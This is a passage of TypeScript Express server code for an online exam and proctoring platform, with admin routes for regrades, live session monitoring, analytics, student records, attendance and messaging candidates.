app.post("/api/admin/attempts/:id/second-mark", requireRoles(...GRADERS), async (req, res) => {
  const attempt = db.data!.attempts.find((a) => a.id === req.params.id);
  if (!attempt) return res.status(404).json({ error: "Attempt not found." });
  const user = currentUser(req)!;
  const raw = Number(req.body?.score);
  if (!Number.isFinite(raw)) return res.status(400).json({ error: "A score (0–100) is required." });
  const score = Math.max(0, Math.min(100, Math.round(raw)));
  attempt.secondMark = { graderId: user.id, graderName: user.name, score, at: now() };
  await db.upsert("attempts", attempt);
  await recordAudit(req, "result.second_marked", `${attempt.score}% vs ${score}%`);
  res.json({ secondMark: attempt.secondMark, firstScore: attempt.score, discrepancy: Math.abs((attempt.score ?? 0) - score) });
});

// ---- admin: regrade / appeals queue ----
app.get("/api/admin/regrades", requireRoles(...GRADERS), (_req, res) => {
  const rows = db.data!.regradeRequests
    .map((r) => {
      const exam = db.data!.exams.find((e) => e.id === r.examId);
      const cand = db.data!.users.find((u) => u.id === r.candidateId);
      const attempt = db.data!.attempts.find((a) => a.id === r.attemptId);
      return { ...r, examTitle: exam?.title ?? "Examination", candidateName: cand?.name ?? "Candidate", currentScore: attempt?.score ?? null };
    })
    .sort((a, b) => (a.status === "open" ? 0 : 1) - (b.status === "open" ? 0 : 1) || (b.createdAt).localeCompare(a.createdAt));
  res.json({ requests: rows, open: rows.filter((r) => r.status === "open").length });
});

app.post("/api/admin/regrades/:id/resolve", requireRoles(...GRADERS), async (req, res) => {
  const r = db.data!.regradeRequests.find((x) => x.id === req.params.id);
  if (!r) return res.status(404).json({ error: "Request not found." });
  const user = currentUser(req)!;
  r.status = req.body?.status === "rejected" ? "rejected" : "resolved";
  r.response = String(req.body?.response ?? "").slice(0, 2000) || null;
  r.resolvedAt = now();
  r.resolvedBy = user.name;
  // Optional score adjustment when resolving in the candidate's favour.
  const newScore = Number(req.body?.newScore);
  if (r.status === "resolved" && Number.isFinite(newScore)) {
    const attempt = db.data!.attempts.find((a) => a.id === r.attemptId);
    if (attempt) {
      const exam = db.data!.exams.find((e) => e.id === attempt.examId);
      const sc = Math.max(0, Math.min(100, Math.round(newScore)));
      r.scoreAfter = sc;
      attempt.score = sc;
      attempt.passed = sc >= (exam?.passingScore ?? 0);
      const cert = attempt.passed ? issueCertificate(attempt) : null;
      await db.upsert("attempts", attempt);
      if (cert) await db.upsert("certificates", cert);
      void notifyResultReleased(attempt);
    }
  }
  await db.upsert("regradeRequests", r);
  await recordAudit(req, "regrade.resolved", `${r.status}${r.scoreAfter != null ? ` → ${r.scoreAfter}%` : ""}`);
  res.json({ request: r });
});

// ---- admin: live monitor ----
app.get("/api/admin/live", requireRoles(...STAFF), async (_req, res) => {
  const userName = (id: string) => db.data!.users.find((u) => u.id === id)?.name ?? "Candidate";
  const inProgress = db.data!.attempts.filter((a) => a.status === "in_progress");
  const evMap = await proctorStore.forAttempts(inProgress.map((a) => a.id));
  const ansMap = await answerStore.forAttempts(inProgress.map((a) => a.id));
  const sessions = await Promise.all(inProgress.map(async (a) => {
    const exam = db.data!.exams.find((e) => e.id === a.examId);
    const events = evMap.get(a.id) ?? [];
    const questionCount = db.data!.questions.filter((q) => q.examId === a.examId).length;
    const answeredCount = (ansMap.get(a.id) ?? []).filter((an) => an.value).length;
    return {
      attemptId: a.id,
      candidateName: userName(a.candidateId),
      examTitle: exam?.title ?? "Examination",
      startedAt: a.startedAt,
      durationMinutes: a.durationMinutes,
      flagCount: flaggedCount(events),
      integrity: scoreOf(events),
      answeredCount,
      questionCount,
      recentEvents: events.slice(-4).reverse(),
      snapshot: await latestSnapshot(a.id),
      paused: !!a.paused,
    };
  }));
  res.json({ sessions });
});

// Live detail for the intervene drawer: full event timeline + snapshot strip + state.
app.get("/api/admin/attempts/:id/live", requireRoles(...STAFF), async (req, res) => {
  const a = db.data!.attempts.find((x) => x.id === req.params.id);
  if (!a) return res.status(404).json({ error: "Attempt not found." });
  const exam = db.data!.exams.find((e) => e.id === a.examId);
  const candidate = db.data!.users.find((u) => u.id === a.candidateId);
  const events = cleanEvents(await proctorStore.forAttempt(a.id), a.submittedAt);
  const snaps = (await snapshotStore.forAttempt(a.id)).map((s) => ({ id: s.id, dataUrl: decryptString(s.dataUrl), at: s.at }));
  const questionCount = db.data!.questions.filter((q) => q.examId === a.examId).length;
  const answeredCount = (await answerStore.forAttempt(a.id)).filter((an) => an.value).length;
  res.json({
    attemptId: a.id,
    candidateName: candidate?.name ?? "Candidate",
    examTitle: exam?.title ?? "Examination",
    status: a.status,
    paused: !!a.paused,
    terminated: !!a.terminated,
    messages: a.proctorMessages ?? [],
    events: events.slice().reverse(),
    snapshots: snaps,
    integrity: scoreOf(events),
    flagCount: flaggedCount(events),
    answeredCount, questionCount,
    deadlineAt: new Date(attemptDeadlineMs(a)).toISOString(),
    serverNow: now(),
  });
});

// Proctor → candidate message.
app.post("/api/admin/attempts/:id/message", requireRoles(...STAFF), async (req, res) => {
  const a = db.data!.attempts.find((x) => x.id === req.params.id);
  if (!a) return res.status(404).json({ error: "Attempt not found." });
  const text = String(req.body?.text ?? "").trim().slice(0, 500);
  if (!text) return res.status(400).json({ error: "Message text is required." });
  a.proctorMessages = [...(a.proctorMessages ?? []), { id: nanoid(8), text, at: now() }];
  await db.upsert("attempts", a);
  await recordAudit(req, "proctor.message", `to ${db.data!.users.find((u) => u.id === a.candidateId)?.name ?? "candidate"}`);
  res.json({ messages: a.proctorMessages });
});

// Pause / resume an attempt (freezes the candidate's timer).
app.post("/api/admin/attempts/:id/pause", requireRoles(...STAFF), async (req, res) => {
  const a = db.data!.attempts.find((x) => x.id === req.params.id);
  if (!a) return res.status(404).json({ error: "Attempt not found." });
  if (a.status !== "in_progress") return res.status(409).json({ error: "Attempt is not in progress." });
  const pause = req.body?.paused !== false;
  if (pause && !a.paused) { a.paused = true; a.pausedAt = now(); }
  else if (!pause && a.paused) {
    a.pausedMs = (a.pausedMs ?? 0) + Math.max(0, Date.now() - new Date(a.pausedAt ?? now()).getTime());
    a.paused = false; a.pausedAt = null;
  }
  await db.upsert("attempts", a);
  await recordAudit(req, pause ? "proctor.pause" : "proctor.resume", a.id);
  res.json({ paused: !!a.paused, deadlineAt: new Date(attemptDeadlineMs(a)).toISOString() });
});

// Terminate (force-submit) an attempt.
app.post("/api/admin/attempts/:id/terminate", requireRoles(...STAFF), async (req, res) => {
  const a = db.data!.attempts.find((x) => x.id === req.params.id);
  if (!a) return res.status(404).json({ error: "Attempt not found." });
  if (a.status === "submitted") return res.json({ ok: true, alreadySubmitted: true });
  const reason = String(req.body?.reason ?? "").trim().slice(0, 300) || "Terminated by proctor";
  await forceSubmitAttempt(a, reason);
  await recordAudit(req, "proctor.terminate", `${db.data!.users.find((u) => u.id === a.candidateId)?.name ?? "candidate"} · ${reason}`);
  res.json({ ok: true });
});

// ---- admin: analytics ----
app.get("/api/admin/analytics", requireRoles(...GRADERS), async (_req, res) => {
  const submitted = db.data!.attempts.filter((a) => a.status === "submitted");
  const scores = submitted.map((a) => a.score ?? 0);
  const evMap = await proctorStore.forAttempts(submitted.map((a) => a.id));
  const integrityVals = submitted.map((a) => scoreOf(cleanEvents(evMap.get(a.id) ?? [], a.submittedAt)));
  const avg = (xs: number[]) => (xs.length ? Math.round(xs.reduce((p, c) => p + c, 0) / xs.length) : 0);

  const scoreBuckets = [
    { label: "0–39", count: submitted.filter((a) => (a.score ?? 0) < 40).length },
    { label: "40–59", count: submitted.filter((a) => { const s = a.score ?? 0; return s >= 40 && s < 60; }).length },
    { label: "60–79", count: submitted.filter((a) => { const s = a.score ?? 0; return s >= 60 && s < 80; }).length },
    { label: "80–100", count: submitted.filter((a) => (a.score ?? 0) >= 80).length },
  ];
  const integrityBuckets = [
    { label: "Critical (<60)", count: integrityVals.filter((v) => v < 60).length },
    { label: "Moderate (60–79)", count: integrityVals.filter((v) => v >= 60 && v < 80).length },
    { label: "Minor (80–99)", count: integrityVals.filter((v) => v >= 80 && v < 100).length },
    { label: "Clean (100)", count: integrityVals.filter((v) => v === 100).length },
  ];
  const flagsByType: Record<string, number> = {};
  for (const e of await proctorStore.allFlagged()) {
    flagsByType[e.type] = (flagsByType[e.type] ?? 0) + 1;
  }
  const perExam = db.data!.exams
    .map((exam) => {
      const ax = submitted.filter((a) => a.examId === exam.id);
      return { title: exam.title, attempts: ax.length, avgScore: avg(ax.map((a) => a.score ?? 0)), passRate: ax.length ? Math.round((ax.filter((a) => a.passed).length / ax.length) * 100) : 0 };
    })
    .filter((e) => e.attempts > 0);

  res.json({
    totals: {
      exams: db.data!.exams.length,
      published: db.data!.exams.filter((e) => e.status === "published").length,
      candidates: db.data!.users.filter((u) => u.role === "candidate").length,
      submitted: submitted.length,
      certificates: db.data!.certificates.length,
    },
    passRate: submitted.length ? Math.round((submitted.filter((a) => a.passed).length / submitted.length) * 100) : 0,
    avgScore: avg(scores),
    avgIntegrity: avg(integrityVals),
    scoreBuckets,
    integrityBuckets,
    perExam,
    flagsByType,
  });
});

// Rich aggregation for the Results & Analytics dashboard.
app.get("/api/admin/analytics-overview", requireRoles(...GRADERS), async (_req, res) => {
  const d = db.data!;
  const submitted = d.attempts.filter((a) => a.status === "submitted" && !examById(a.examId)?.practice);
  const avg = (xs: number[]) => (xs.length ? Math.round(xs.reduce((p, c) => p + c, 0) / xs.length) : 0);
  const nameOf = (id: string) => d.users.find((u) => u.id === id)?.name ?? "Candidate";
  const scores = submitted.map((a) => a.score ?? 0);

  // KPI cards
  const avgScore = scores.length ? Math.round(avg(scores) * 10) / 10 : 0;
  const highest = scores.length ? Math.max(...scores) : 0;
  const durations = submitted.filter((a) => a.submittedAt).map((a) => (new Date(a.submittedAt!).getTime() - new Date(a.startedAt).getTime()) / 60000).filter((m) => m > 0 && m < 24 * 60);
  const avgMin = durations.length ? Math.round(avg(durations)) : 0;
  let top = { name: "—", score: 0 };
  for (const a of submitted) { const s = a.score ?? 0; if (s > top.score) top = { name: nameOf(a.candidateId), score: s }; }

  // Per-subject stats (subject = exam)
  const exams = d.exams.filter((e) => !e.practice);
  const subjStats = exams
    .map((e) => { const ax = submitted.filter((a) => a.examId === e.id); const ss = ax.map((a) => a.score ?? 0); return { id: e.id, subject: e.subject || e.title, attempts: ax.length, avg: avg(ss), under50: ss.length ? Math.round((ss.filter((s) => s < 50).length / ss.length) * 100) : 0 }; })
    .filter((s) => s.attempts > 0);

  // Heatmap: subject × last-8-months average score
  const nowD = new Date();
  const months: { key: string; label: string }[] = [];
  for (let i = 7; i >= 0; i--) { const x = new Date(nowD.getFullYear(), nowD.getMonth() - i, 1); months.push({ key: `${x.getFullYear()}-${x.getMonth()}`, label: x.toLocaleString(undefined, { month: "short" }) }); }
  const mKey = (iso: string) => { const x = new Date(iso); return `${x.getFullYear()}-${x.getMonth()}`; };
  const heatmap = subjStats.slice(0, 10).map((s) => ({
    subject: s.subject,
    cells: months.map((m) => { const ax = submitted.filter((a) => a.examId === s.id && a.submittedAt && mKey(a.submittedAt!) === m.key); return ax.length ? avg(ax.map((a) => a.score ?? 0)) : null; }),
  }));

  // Question-level analysis: per-question correctness across recent submissions
  const ansMap = await answerStore.forAttempts(submitted.slice(-300).map((a) => a.id));
  const qStat = new Map<string, { c: number; t: number }>();
  for (const arr of ansMap.values()) for (const an of arr) { const st = qStat.get(an.questionId) ?? { c: 0, t: 0 }; st.t++; if (an.correct === true) st.c++; qStat.set(an.questionId, st); }
  const rates = [...qStat.values()].filter((s) => s.t > 0).map((s) => s.c / s.t);
  const totalQ = rates.length || 1;
  const bucket = (arr: number[]) => ({ share: Math.round((arr.length / totalQ) * 100), correct: arr.length ? Math.round((arr.reduce((p, c) => p + c, 0) / arr.length) * 100) : 0 });
  const questionLevels = [
    { tier: "Easy to answer", ...bucket(rates.filter((r) => r >= 0.7)), tone: "green" },
    { tier: "Difficult to answer", ...bucket(rates.filter((r) => r >= 0.4 && r < 0.7)), tone: "amber" },
    { tier: "Hard to answer", ...bucket(rates.filter((r) => r < 0.4)), tone: "red" },
  ];

  // Enrollment funnel
  const candidateIds = new Set(d.users.filter((u) => u.role === "candidate").map((u) => u.id));
  const enrolled = new Set(d.registrations.filter((r) => candidateIds.has(r.candidateId)).map((r) => r.candidateId));
  const funnel = { students: candidateIds.size, enrolled: enrolled.size, completed: new Set(submitted.map((a) => a.candidateId)).size };

  // Recommendation for the weakest subject
  const weakest = [...subjStats].sort((a, b) => a.avg - b.avg)[0] ?? null;
  const recommendations = weakest ? { subject: weakest.subject, avg: weakest.avg, under50: weakest.under50 } : null;

  // Performance growth over multiple attempts (per registration, ordered)
  const byReg = new Map<string, Attempt[]>();
  for (const a of submitted) { const arr = byReg.get(a.registrationId) ?? []; arr.push(a); byReg.set(a.registrationId, arr); }
  const idxScores = new Map<number, number[]>();
  for (const arr of byReg.values()) { arr.sort((x, y) => x.startedAt.localeCompare(y.startedAt)); arr.forEach((a, i) => { const list = idxScores.get(i) ?? []; list.push(a.score ?? 0); idxScores.set(i, list); }); }
  const growth = [...idxScores.entries()].sort((a, b) => a[0] - b[0]).slice(0, 5).map(([i, list]) => ({ attempt: i + 1, avg: avg(list) }));

  // Rapid performance acceleration — derived from the weakest subjects
  const priorities = ["Urgent", "High", "Medium", "Low"];
  const actions = ["Peer mentoring + targeted review", "Key-concept review session", "Add practice attempts", "Vocabulary / drills sprint"];
  const impacts = ["High avg gain", "Reduce fail rate", "+ completion", "+ mastery"];
  const rapid = [...subjStats].sort((a, b) => a.avg - b.avg).slice(0, 4).map((s, i) => ({
    priority: priorities[i] ?? "Low",
    focus: s.subject,
    status: s.under50 >= 40 ? `${s.under50}% scored <50` : `avg ${s.avg}%`,
    action: actions[i] ?? actions[3],
    impact: impacts[i] ?? impacts[3],
  }));

  res.json({ cards: { avgScore, highest, totalAnalyzed: submitted.length, avgMin, top }, heatMonths: months.map((m) => m.label), heatmap, questionLevels, funnel, recommendations, growth, rapid });
});

// ---- admin: certificates ----
app.get("/api/admin/certificates", requireRoles(...GRADERS), (_req, res) => {
  const certificates = db.data!.certificates
    .map((c) => ({
      certNumber: c.certNumber,
      score: c.score,
      issuedAt: c.issuedAt,
      examTitle: db.data!.exams.find((e) => e.id === c.examId)?.title ?? "Examination",
      candidateName: db.data!.users.find((u) => u.id === c.candidateId)?.name ?? "Candidate",
    }))
    .sort((a, b) => b.issuedAt.localeCompare(a.issuedAt));
  res.json({ certificates });
});

// ---- admin: registrations (one row per candidate↔exam enrolment) ----
app.get("/api/admin/registrations", requireRole("admin"), (_req, res) => {
  const candidateIds = new Set(db.data!.users.filter((u) => u.role === "candidate").map((u) => u.id));
  const rows = db.data!.registrations
    .filter((r) => candidateIds.has(r.candidateId))
    .map((r) => {
    const exam = db.data!.exams.find((e) => e.id === r.examId);
    const cand = db.data!.users.find((u) => u.id === r.candidateId);
    const attempt = db.data!.attempts
      .filter((a) => a.registrationId === r.id)
      .sort((a, b) => b.startedAt.localeCompare(a.startedAt))[0] ?? null;
    return {
      id: r.id,
      examTitle: exam?.title ?? "Examination",
      examCode: exam?.code ?? "",
      candidateId: r.candidateId,
      candidateName: cand?.name ?? "Candidate",
      candidateEmail: cand?.email ?? "",
      status: r.status,
      approval: r.approval,
      scheduled: r.scheduledStart ?? exam?.availableFrom ?? null,
      systemCheckPassed: r.systemCheckPassed,
      identity: r.studentRef ?? null,
      score: attempt?.status === "submitted" ? attempt.score : null,
      passed: attempt?.passed ?? null,
      attemptId: attempt?.id ?? null,
      registeredAt: r.createdAt ?? null,
    };
  }).sort((a, b) => (b.registeredAt ?? "").localeCompare(a.registeredAt ?? ""));

  const totals = {
    total: rows.length,
    confirmed: rows.filter((r) => r.approval === "confirmed" && r.status !== "submitted").length,
    pending: rows.filter((r) => r.approval === "pending" && r.status !== "submitted").length,
    completed: rows.filter((r) => r.status === "submitted").length,
  };
  res.json({ totals, registrations: rows });
});

app.patch("/api/admin/registrations/:id/status", requireRole("admin"), async (req, res) => {
  const reg = db.data!.registrations.find((r) => r.id === req.params.id);
  if (!reg) return res.status(404).json({ error: "Registration not found." });
  const approval = req.body?.approval;
  let justConfirmed = false;
  if (approval !== undefined) {
    if (!["pending", "confirmed", "rejected"].includes(approval)) {
      return res.status(400).json({ error: "Invalid status." });
    }
    justConfirmed = approval === "confirmed" && reg.approval !== "confirmed";
    reg.approval = approval;
  }
  // Optional reschedule: ISO datetime, or null to clear the window.
  if ("scheduledStart" in (req.body ?? {})) {
    reg.scheduledStart = req.body.scheduledStart ? String(req.body.scheduledStart) : null;
  }
  await db.upsert("registrations", reg);
  if (justConfirmed) void notifyRegistered(reg);
  res.json({ ok: true, registration: reg });
});

// ---- admin: candidate directory ----
app.get("/api/admin/candidate-stats", requireRole("admin"), (_req, res) => {
  const candidates = db.data!.users
    .filter((u) => u.role === "candidate")
    .map((u) => {
      const myAttempts = db.data!.attempts.filter((a) => a.candidateId === u.id && a.status === "submitted");
      const scores = myAttempts.map((a) => a.score ?? 0);
      const last = myAttempts.map((a) => a.submittedAt).filter(Boolean).sort().pop() ?? null;
      return {
        id: u.id,
        name: u.name,
        email: u.email,
        registered: db.data!.registrations.filter((r) => r.candidateId === u.id).length,
        submitted: myAttempts.length,
        avgScore: scores.length ? Math.round(scores.reduce((p, c) => p + c, 0) / scores.length) : 0,
        certificates: db.data!.certificates.filter((c) => c.candidateId === u.id).length,
        lastActivity: last,
      };
    });
  res.json({ candidates });
});

// ---- admin: Students (SIS) — student-centric records ----
// One row per student, aggregating their whole record (vs. registrations = per-exam rows).
app.get("/api/admin/students", requireRole("admin"), async (_req, res) => {
  const evMap = await proctorStore.forAttempts(db.data!.attempts.filter((a) => a.status === "submitted").map((a) => a.id));
  const students = db.data!.users
    .filter((u) => u.role === "candidate")
    .map((u) => {
      const regs = db.data!.registrations.filter((r) => r.candidateId === u.id);
      const attempts = db.data!.attempts.filter((a) => a.candidateId === u.id && a.status === "submitted");
      const scores = attempts.map((a) => a.score ?? 0);
      const integrities = attempts.map((a) => scoreOf(cleanEvents(evMap.get(a.id) ?? [], a.submittedAt)));
      const last = attempts.map((a) => a.submittedAt).filter(Boolean).sort().pop() ?? null;
      const missingDays = regs.filter((r) => attendanceFor(r, db.data!.exams.find((e) => e.id === r.examId)) === "absent").length;
      return {
        id: u.id,
        name: u.name,
        email: u.email,
        gender: u.gender ?? null,
        age: u.age ?? null,
        studentClass: u.studentClass ?? null,
        phone: u.phone ? (decryptString(u.phone) ?? null) : null,
        enrollments: regs.length,
        confirmed: regs.filter((r) => r.approval === "confirmed").length,
        completed: attempts.length,
        avgScore: scores.length ? Math.round(scores.reduce((p, c) => p + c, 0) / scores.length) : null,
        avgIntegrity: integrities.length ? Math.round(integrities.reduce((p, c) => p + c, 0) / integrities.length) : null,
        certificates: db.data!.certificates.filter((c) => c.candidateId === u.id).length,
        missingDays,
        lastActivity: last,
      };
    })
    .sort((a, b) => a.name.localeCompare(b.name));

  const totalScores = students.flatMap((s) => (s.avgScore !== null ? [s.avgScore] : []));
  const classes = db.data!.classes
    .sort((a, b) => a.name.localeCompare(b.name))
    .map((c) => ({ id: c.id, name: c.name, code: c.code ?? "", memberIds: c.memberIds }));
  res.json({
    students,
    classes,
    totals: {
      students: students.length,
      completed: students.reduce((s, x) => s + x.completed, 0),
      certificates: students.reduce((s, x) => s + x.certificates, 0),
      avgScore: totalScores.length ? Math.round(totalScores.reduce((p, c) => p + c, 0) / totalScores.length) : null,
    },
  });
});

app.patch("/api/admin/students/:id", requireRole("admin"), async (req, res) => {
  const u = db.data!.users.find((x) => x.id === req.params.id && x.role === "candidate");
  if (!u) return res.status(404).json({ error: "Student not found." });
  const b = req.body ?? {};
  if (typeof b.name === "string" && b.name.trim()) u.name = b.name.trim();
  if (typeof b.email === "string" && b.email.trim()) {
    const taken = db.data!.users.find((x) => x.id !== u.id && x.email.toLowerCase() === b.email.trim().toLowerCase());
    if (taken) return res.status(409).json({ error: "Another account already uses that email." });
    u.email = b.email.trim();
  }
  if (typeof b.gender === "string") u.gender = b.gender;
  if ("age" in b) u.age = b.age === null || b.age === "" ? undefined : Number(b.age);
  if (typeof b.studentClass === "string") u.studentClass = b.studentClass.trim();
  if (typeof b.phone === "string") u.phone = b.phone.trim() ? encryptString(b.phone.trim()) : undefined;
  await db.upsert("users", u);
  await recordAudit(req, "student.updated", `${u.name} <${u.email}>`);
  res.json({ ok: true });
});

app.get("/api/admin/students/:id", requireRole("admin"), async (req, res) => {
  const u = db.data!.users.find((x) => x.id === req.params.id && x.role === "candidate");
  if (!u) return res.status(404).json({ error: "Student not found." });
  const examOf = (id: string) => db.data!.exams.find((e) => e.id === id);
  const evMap = await proctorStore.forAttempts(db.data!.attempts.filter((a) => a.candidateId === u.id && a.status === "submitted").map((a) => a.id));

  const enrollments = db.data!.registrations
    .filter((r) => r.candidateId === u.id)
    .map((r) => {
      const exam = examOf(r.examId);
      return {
        regId: r.id,
        examTitle: exam?.title ?? "Examination",
        examCode: exam?.code ?? "",
        status: r.status,
        approval: r.approval,
        scheduled: r.scheduledStart ?? exam?.availableFrom ?? null,
        checkedIn: r.systemCheckPassed,
        identity: r.studentRef ?? null,
        registeredAt: r.createdAt ?? null,
      };
    })
    .sort((a, b) => (b.registeredAt ?? "").localeCompare(a.registeredAt ?? ""));

  const attempts = db.data!.attempts
    .filter((a) => a.candidateId === u.id && a.status === "submitted")
    .map((a) => {
      const exam = examOf(a.examId);
      const cert = db.data!.certificates.find((c) => c.attemptId === a.id);
      return {
        attemptId: a.id,
        examTitle: exam?.title ?? "Examination",
        examCode: exam?.code ?? "",
        score: a.score ?? 0,
        passed: a.passed ?? false,
        gradingStatus: a.gradingStatus ?? "auto_graded",
        submittedAt: a.submittedAt,
        integrity: scoreOf(cleanEvents(evMap.get(a.id) ?? [], a.submittedAt)),
        certNumber: cert?.certNumber ?? null,
      };
    })
    .sort((a, b) => (b.submittedAt ?? "").localeCompare(a.submittedAt ?? ""));

  const certificates = db.data!.certificates
    .filter((c) => c.candidateId === u.id)
    .map((c) => ({ certNumber: c.certNumber, examTitle: examOf(c.examId)?.title ?? "Examination", score: c.score, issuedAt: c.issuedAt }))
    .sort((a, b) => b.issuedAt.localeCompare(a.issuedAt));

  const scores = attempts.map((a) => a.score);
  const integrities = attempts.map((a) => a.integrity);
  res.json({
    student: { id: u.id, name: u.name, email: u.email, accommodationsExtraMinutes: u.accommodationsExtraMinutes ?? 0 },
    aiEnabled: aiEnabled(),
    stats: {
      enrollments: enrollments.length,
      completed: attempts.length,
      avgScore: scores.length ? Math.round(scores.reduce((p, c) => p + c, 0) / scores.length) : null,
      passRate: attempts.length ? Math.round((attempts.filter((a) => a.passed).length / attempts.length) * 100) : null,
      avgIntegrity: integrities.length ? Math.round(integrities.reduce((p, c) => p + c, 0) / integrities.length) : null,
      certificates: certificates.length,
      gpa: cumulativeGpa(scores),
    },
    enrollments,
    attempts,
    certificates,
    trend: buildStudentTrend(u.id),
  });
});

// ---- admin: Attendance — per-exam session roster ----
type AttendanceStatus = "completed" | "in_progress" | "present" | "absent" | "expected" | "not_confirmed";

/** Derive a candidate's attendance for one exam from their registration + attempt. */
function attendanceFor(reg: Registration, exam: Exam | undefined): AttendanceStatus {
  if (reg.approval !== "confirmed") return "not_confirmed";
  if (reg.status === "submitted") return "completed";
  if (reg.status === "in_progress") return "in_progress";
  if (reg.status === "checked_in" || reg.systemCheckPassed || reg.checkedInAt) return "present";
  // Not checked in: absent only once the scheduled window has clearly passed.
  const scheduled = reg.scheduledStart ?? exam?.availableFrom ?? null;
  if (scheduled) {
    const endMs = new Date(scheduled).getTime() + (exam?.durationMinutes ?? 0) * 60_000;
    if (Date.now() > endMs) return "absent";
  }
  return "expected";
}

app.get("/api/admin/attendance", requireRole("admin"), (_req, res) => {
  const candidateIds = new Set(db.data!.users.filter((u) => u.role === "candidate").map((u) => u.id));
  const sessions = db.data!.exams
    .map((exam) => {
      const regs = db.data!.registrations.filter((r) => r.examId === exam.id && candidateIds.has(r.candidateId));
      const statuses = regs.map((r) => attendanceFor(r, exam));
      const confirmed = statuses.filter((s) => s !== "not_confirmed").length;
      const present = statuses.filter((s) => s === "present" || s === "in_progress" || s === "completed").length;
      return {
        examId: exam.id,
        title: exam.title,
        code: exam.code,
        status: exam.status,
        scheduled: exam.availableFrom ?? null,
        enrolled: regs.length,
        confirmed,
        present,
        completed: statuses.filter((s) => s === "completed").length,
        inProgress: statuses.filter((s) => s === "in_progress").length,
        absent: statuses.filter((s) => s === "absent").length,
      };
    })
    .sort((a, b) => b.enrolled - a.enrolled || a.title.localeCompare(b.title));
  res.json({ sessions });
});

app.get("/api/admin/attendance/:examId", requireRole("admin"), (req, res) => {
  const exam = db.data!.exams.find((e) => e.id === req.params.examId);
  if (!exam) return res.status(404).json({ error: "Exam not found." });
  const roster = db.data!.registrations
    .filter((r) => r.examId === exam.id)
    .map((r) => {
      const u = db.data!.users.find((x) => x.id === r.candidateId);
      if (!u || u.role !== "candidate") return null;
      const attempt = db.data!.attempts
        .filter((a) => a.registrationId === r.id)
        .sort((a, b) => b.startedAt.localeCompare(a.startedAt))[0] ?? null;
      return {
        candidateId: u.id,
        name: u.name,
        email: u.email,
        status: attendanceFor(r, exam),
        approval: r.approval,
        scheduled: r.scheduledStart ?? exam.availableFrom ?? null,
        checkedInAt: r.checkedInAt ?? null,
        startedAt: attempt?.startedAt ?? null,
        submittedAt: attempt?.submittedAt ?? null,
        identity: r.studentRef ?? null,
        hasPhoto: !!r.verificationPhoto,
        rulesAccepted: !!r.rulesAcceptedAt,
        attemptId: attempt?.id ?? null,
      };
    })
    .filter(Boolean)
    .sort((a, b) => (a!.name).localeCompare(b!.name));

  const statuses = (roster as NonNullable<(typeof roster)[number]>[]).map((r) => r.status);
  res.json({
    exam: { id: exam.id, title: exam.title, code: exam.code, durationMinutes: exam.durationMinutes, scheduled: exam.availableFrom ?? null },
    summary: {
      enrolled: roster.length,
      present: statuses.filter((s) => s === "present" || s === "in_progress" || s === "completed").length,
      inProgress: statuses.filter((s) => s === "in_progress").length,
      completed: statuses.filter((s) => s === "completed").length,
      absent: statuses.filter((s) => s === "absent").length,
    },
    roster,
  });
});

// ---- admin: Communication — send messages to candidates (recorded to the mock outbox) ----
app.post("/api/admin/communication/send", requireRoles(...GRADERS), async (req, res) => {
  const { audience, examId, candidateIds, subject, body } = req.body ?? {};
  if (!subject || !body) return res.status(400).json({ error: "Subject and body are required." });

  const candidates = db.data!.users.filter((u) => u.role === "candidate");
  let recipients: typeof candidates = [];
  if (audience === "exam" && examId) {
    const ids = new Set(db.data!.registrations.filter((r) => r.examId === examId).map((r) => r.candidateId));
    recipients = candidates.filter((u) => ids.has(u.id));
  } else if (audience === "selected" && Array.isArray(candidateIds)) {
    const ids = new Set(candidateIds.map(String));
    recipients = candidates.filter((u) => ids.has(u.id));
  } else {
    recipients = candidates; // "all"
  }
  if (recipients.length === 0) return res.status(400).json({ error: "No recipients matched." });

  // Personalise simple {{name}} / {{email}} placeholders per recipient, then send.
  let delivered = 0, failed = 0;
  for (const u of recipients) {
    const subj = String(subject).replace(/\{\{name\}\}/g, u.name).replace(/\{\{email\}\}/g, u.email);
    const text = String(body).replace(/\{\{name\}\}/g, u.name).replace(/\{\{email\}\}/g, u.email);
    const r = await sendMail(u.email, subj, text);
    if (r.delivery === "sent") delivered++;
    else if (r.delivery === "failed") failed++;
  }
  res.json({ ok: true, sent: recipients.length, delivered, failed, mailer: mailerStatus() });
});

app.get("/api/admin/communication/status", requireRoles(...GRADERS), (_req, res) => {
  res.json(mailerStatus());
});

// ---- admin: SMS / WhatsApp reminders ----
app.get("/api/admin/sms/status", requireRoles(...GRADERS), (_req, res) => {
  res.json({ ...smsStatus(), recent: recentSms(50) });
});
app.post("/api/admin/sms/test", requireRole("admin"), async (req, res) => {
  const to = String(req.body?.to ?? "").trim();
  if (!to) return res.status(400).json({ error: "Provide a phone number to test." });
  const r = await sendSms(to, "Test message from Oriole — your SMS reminders are working.");
  await recordAudit(req, "sms.test", to);
  res.json({ ...r, status: smsStatus() });
});

// ---- admin: Announcements ----
function audienceUsers(audience: string) {
  const users = db.data!.users;
  if (audience === "students") return users.filter((u) => u.role === "candidate");
  if (audience === "admins") return users.filter((u) => u.role === "admin");
  if (audience === "instructors") return []; // no instructor role yet
  return users; // everyone
}

app.get("/api/admin/announcements", requireRoles(...GRADERS), (_req, res) => {
  const announcements = [...db.data!.announcements].sort((a, b) => b.createdAt.localeCompare(a.createdAt));
  res.json({
    announcements,
    kpis: {
      total: announcements.length,
      sent: announcements.filter((a) => a.status === "sent").length,
      scheduled: announcements.filter((a) => a.status === "scheduled").length,
      drafts: announcements.filter((a) => a.status === "draft").length,
    },
  });
});

app.post("/api/admin/announcements", requireRoles(...GRADERS), async (req, res) => {
  const user = currentUser(req)!;
  const { title, message, audience, priority, channels, scheduledFor, draft, pinned, department } = req.body ?? {};
  if (!title?.trim() || !message?.trim()) return res.status(400).json({ error: "Title and message are required." });

  const validChannels = ["in_app", "email", "sms", "whatsapp"];
  const chans: string[] = Array.isArray(channels) ? channels.filter((c) => validChannels.includes(c)) : ["in_app"];
  if (chans.length === 0) chans.push("in_app");
  const aud = ["everyone", "students", "instructors", "admins"].includes(audience) ? audience : "students";

  let status: "draft" | "scheduled" | "sent" = "sent";
  if (draft) status = "draft";
  else if (scheduledFor && new Date(scheduledFor).getTime() > Date.now()) status = "scheduled";

  // The email channel delivers immediately on send via the configured mailer.
  let emailedCount = 0;
  if (status === "sent" && chans.includes("email")) {
    for (const u of audienceUsers(aud)) {
      if (!u.email) continue;
      await sendMail(u.email, `[Announcement] ${title}`, message);
      emailedCount++;
    }
  }

  const ann = {
    id: nanoid(12),
    title: String(title).trim(),
